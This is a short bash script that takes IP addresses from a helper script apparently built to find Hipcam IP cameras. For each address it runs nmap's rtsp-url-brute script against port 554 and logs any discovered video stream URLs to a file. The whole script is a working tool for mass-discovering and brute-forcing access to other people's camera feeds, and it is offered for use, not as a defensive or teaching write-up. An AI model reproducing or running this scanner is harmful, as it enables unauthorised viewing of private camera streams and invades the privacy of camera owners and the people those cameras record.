#!/usr/bin/bash 

# scan for IPs
python3 hipcam-find.py | sed 1,50d > found-hipcams.txt

# bruteforce rtsp urls one at a time
# save the results in 
cat found-hipcams.txt | while read line
do
        echo "SCANNING IP $line" | tee -a found-streams.txt 
        nmap -T4 -Pn --script rtsp-url-brute -p 554 $line > nmap-rtsp-results.txt
        cat nmap-rtsp-results.txt | awk '/discovered/{f=1;next} /other/{f=0} f' | tee -a found-streams.txt

        echo "END" | tee -a found-streams.txt
done
